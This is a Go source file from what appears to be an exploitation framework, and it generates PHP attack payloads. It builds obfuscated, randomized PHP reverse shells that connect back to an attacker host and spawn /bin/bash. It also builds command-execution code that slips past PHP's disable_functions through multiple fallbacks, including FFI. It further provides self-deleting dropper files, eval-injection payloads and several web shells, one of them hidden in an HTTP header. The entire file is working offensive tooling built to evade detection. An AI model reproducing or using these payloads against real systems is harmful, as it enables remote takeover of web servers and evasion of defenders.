package payload

import "github.com/Chocapikk/pik/sdk"

func init() {
	sdk.SetPHPReverseShell(PHPReverseShellDrop)
	sdk.SetPHPSystem(PHPSystemDrop)
	sdk.SetPHPEvalShell(PHPEvalReverseShell)
	sdk.SetPHPEvalSystem(PHPEvalSystemExec)
}

// phpReverseShell returns raw PHP code for a reverse shell via proc_open.
func phpReverseShell(lhost string, lport int) string {
	vFs := phpVarName()
	vPo := phpVarName()
	return sdk.Sprintf(
		`$%s=%s;$%s=%s;$s=$%s("%s",%d);$p=$%s(%s,[0=>$s,1=>$s,2=>$s],$pipes);`,
		vFs, phpEncodeStr("fsockopen"), vPo, phpEncodeStr("proc_open"),
		vFs, lhost, lport, vPo, phpEncodeStr("/bin/bash -i"),
	)
}

// phpExecCmd returns raw PHP code that executes a shell command using
// multiple fallback functions, bypassing disable_functions restrictions.
// Polymorphic: variable names, preamble order, function order, condition
// structure, string encoding, and call style are all randomized per generation.
func phpExecCmd(cmd string) string {
	b64 := sdk.Base64Encode(cmd)
	v := phpVars("d", "c", "f", "r", "p")
	d, c, f, r, p := v["d"], v["c"], v["f"], v["r"], v["p"]

	vEr, vStl, vIua := phpVarName(), phpVarName(), phpVarName()
	preamble := sdk.Shuffle([]string{
		sdk.Sprintf(`$%s=%s;@$%s(0)`, vEr, phpEncodeStr("error_reporting"), vEr),
		sdk.Sprintf(`$%s=%s;@$%s(0)`, vStl, phpEncodeStr("set_time_limit"), vStl),
		sdk.Sprintf(`$%s=%s;@$%s(1)`, vIua, phpEncodeStr("ignore_user_abort"), vIua),
	})

	// Encode each function name differently for the foreach array.
	simple := sdk.Shuffle([]string{"system", "passthru", "shell_exec", "exec"})
	encoded := make([]string, len(simple))
	for i, fn := range simple {
		encoded[i] = phpEncodeStr(fn)
	}

	guard := phpGuard(f, d)
	call := phpCall(f, c)

	// Each heavy fallback assigns an encoded function name to a temp var,
	// then calls it indirectly - no plaintext function names in output.
	vPo := phpVarName()
	vPc := phpVarName()
	vPr := phpVarName()
	vPe := phpVarName()
	vFfi := phpVarName()

	heavy := sdk.Shuffle([]string{
		sdk.Sprintf(`if(%s){$%s=%s;$%s=%s;@$%s($%s($%s,%s));$%s=1;}`,
			phpCond(r, d, "popen"), vPo, phpEncodeStr("popen"), vPc, phpEncodeStr("pclose"),
			vPc, vPo, c, phpEncodeStr("r"), r),
		sdk.Sprintf(`if(%s){$%s=%s;@$%s($%s,[[%s,%s],[%s,%s],[%s,%s]],$%s);$%s=1;}`,
			phpCond(r, d, "proc_open"), vPr, phpEncodeStr("proc_open"),
			vPr, c,
			phpEncodeStr("pipe"), phpEncodeStr("r"),
			phpEncodeStr("pipe"), phpEncodeStr("w"),
			phpEncodeStr("pipe"), phpEncodeStr("w"),
			p, r),
		sdk.Sprintf(`if(%s){$%s=%s;@$%s(%s,[%s,$%s]);$%s=1;}`,
			phpCond(r, d, "pcntl_exec"), vPe, phpEncodeStr("pcntl_exec"),
			vPe, phpEncodeStr("/bin/sh"), phpEncodeStr("-c"), c, r),
		func() string {
			vCd, vSy := phpVarName(), phpVarName()
			return sdk.Sprintf(`if(!$%s){$%s=%s;if($%s(%s)){$%s=%s;$%s=%s;$%s=%s;@$%s::{$%s}(%s)->{$%s}($%s);$%s=1;}}`,
				r, vFfi, phpEncodeStr("class_exists"),
				vFfi, phpEncodeStr("FFI"), vFfi, phpEncodeStr("FFI"),
				vCd, phpEncodeStr("cdef"),
				vSy, phpEncodeStr("system"),
				vFfi, vCd, phpEncodeStr("int system(const char *command);"),
				vSy, c, r)
		}(),
	})

	vIni := phpVarName()
	vB64 := phpVarName()

	return sdk.Sprintf(`%s;%s;%s;`+
		`$%s=%s;$%s=%s;$%s=@$%s(%s);$%s=$%s('%s');`+
		`if((%s)(PHP_OS,%s))$%s.=" 2>&1\n";`+
		`$%s=0;`+
		`foreach([%s,%s,%s,%s] as $%s){if(%s){%s;$%s=1;break;}}`+
		`%s%s%s%s`,
		preamble[0], preamble[1], preamble[2],
		vIni, phpEncodeStr("ini_get"), vB64, phpEncodeStr("base64_decode"),
		d, vIni, phpEncodeStr("disable_functions"), c, vB64, b64,
		phpEncodeStr("stristr"), phpEncodeStr("win"), c,
		r,
		encoded[0], encoded[1], encoded[2], encoded[3], f, guard, call, r,
		heavy[0], heavy[1], heavy[2], heavy[3],
	)
}

// --- Condition generators (polymorphic) ---

func phpCond(r, d, fn string) string {
	parts := sdk.Shuffle([]string{phpNotRan(r), phpExistsEncoded(fn), phpNotDisabledEncoded(d, fn)})
	return parts[0] + "&&" + parts[1] + "&&" + parts[2]
}

func phpGuard(f, d string) string {
	exists := phpExistsVar(f)
	notDisabled := phpNotDisabledVar(d, f)
	if sdk.RandBool() {
		return exists + "&&" + notDisabled
	}
	return notDisabled + "&&" + exists
}

func phpCall(f, c string) string {
	if sdk.RandBool() {
		return sdk.Sprintf(`$%s($%s)`, f, c)
	}
	vCuf := phpVarName()
	return sdk.Sprintf(`$%s=%s;$%s($%s,$%s)`, vCuf, phpEncodeStr("call_user_func"), vCuf, f, c)
}

func phpNotRan(r string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!$%s`, r)
	case 1:
		return sdk.Sprintf(`$%s==0`, r)
	default:
		return sdk.Sprintf(`0==$%s`, r)
	}
}

func phpExistsEncoded(fn string) string {
	return sdk.Sprintf(`(%s)(%s)`, phpEncodeStr(phpCheckName()), phpEncodeStr(fn))
}

func phpExistsVar(f string) string {
	return sdk.Sprintf(`(%s)($%s)`, phpEncodeStr(phpCheckName()), f)
}

func phpCheckName() string {
	if sdk.RandBool() {
		return "is_callable"
	}
	return "function_exists"
}

func phpNotDisabledEncoded(d, fn string) string {
	enc := phpEncodeStr(fn)
	stristr := phpEncodeStr("stristr")
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!(%s)($%s,%s)`, stristr, d, enc)
	case 1:
		return sdk.Sprintf(`(%s)($%s,%s)===false`, stristr, d, enc)
	default:
		return sdk.Sprintf(`false===(%s)($%s,%s)`, stristr, d, enc)
	}
}

func phpNotDisabledVar(d, f string) string {
	stristr := phpEncodeStr("stristr")
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`!(%s)($%s,$%s)`, stristr, d, f)
	case 1:
		return sdk.Sprintf(`(%s)($%s,$%s)===false`, stristr, d, f)
	default:
		return sdk.Sprintf(`false===(%s)($%s,$%s)`, stristr, d, f)
	}
}

// --- String encoding (polymorphic) ---

func phpEncodeStr(s string) string {
	switch sdk.RandInt(0, 2) {
	case 0:
		return sdk.Sprintf(`base64_decode('%s')`, sdk.Base64Encode(s))
	case 1:
		return sdk.Sprintf(`str_rot13('%s')`, sdk.ROT13(s))
	default:
		return sdk.Sprintf(`hex2bin('%s')`, sdk.HexEncode(s))
	}
}

func phpChrConcat(s string) string {
	var out string
	for i, b := range []byte(s) {
		if i > 0 {
			out += "."
		}
		out += sdk.Sprintf("chr(%d)", b)
	}
	return out
}

func phpVarName() string { return sdk.RandAlpha(6) }

func phpVars(names ...string) map[string]string {
	m := make(map[string]string, len(names))
	for _, n := range names {
		m[n] = sdk.RandAlpha(6)
	}
	return m
}

// --- Drop wrappers (file-based) ---

func phpDrop(code string) string { return sdk.Sprintf(`<?php unlink(__FILE__);%s ?>`, code) }

// PHPReverseShellDrop returns a self-deleting PHP reverse shell for file drop.
func PHPReverseShellDrop(lhost string, lport int) string { return phpDrop(phpReverseShell(lhost, lport)) }

// PHPSystemDrop returns a self-deleting PHP system exec for file drop.
func PHPSystemDrop(cmd string) string { return phpDrop(phpExecCmd(cmd)) }

// --- Eval wrappers (no tags, for eval() injection) ---

// PHPEvalReverseShell returns raw PHP code for eval() injection.
func PHPEvalReverseShell(lhost string, lport int) string { return phpReverseShell(lhost, lport) }

// PHPEvalSystemExec returns raw PHP code for eval() injection.
func PHPEvalSystemExec(cmd string) string { return phpExecCmd(cmd) }

// --- Webshells ---

// PHPWebShell returns a minimal PHP web shell.
func PHPWebShell(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php system($_GET["%s"]); ?>`, param)
}

// PHPWebShellPassthru returns a PHP web shell using passthru for binary output.
func PHPWebShellPassthru(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php passthru($_GET["%s"]); ?>`, param)
}

// PHPWebShellPost returns a PHP web shell that reads from POST body.
func PHPWebShellPost(param string) string {
	if param == "" {
		param = "cmd"
	}
	return sdk.Sprintf(`<?php if(isset($_POST["%s"])){system($_POST["%s"]);} ?>`, param, param)
}

// PHPWebShellStealth returns a PHP web shell hidden in a header.
func PHPWebShellStealth(header string) string {
	if header == "" {
		header = "X-Cmd"
	}
	return sdk.Sprintf(
		`<?php if(isset($_SERVER["HTTP_%s"])){system($_SERVER["HTTP_%s"]);} ?>`,
		phpHeaderKey(header), phpHeaderKey(header),
	)
}

// PHPEval returns a PHP eval shell (POST parameter).
func PHPEval(param string) string {
	if param == "" {
		param = "code"
	}
	return sdk.Sprintf(`<?php eval($_POST["%s"]); ?>`, param)
}

func phpHeaderKey(header string) string {
	result := make([]byte, 0, len(header))
	for _, c := range header {
		switch {
		case c == '-':
			result = append(result, '_')
		case c >= 'a' && c <= 'z':
			result = append(result, byte(c-32))
		default:
			result = append(result, byte(c))
		}
	}
	return string(result)
}
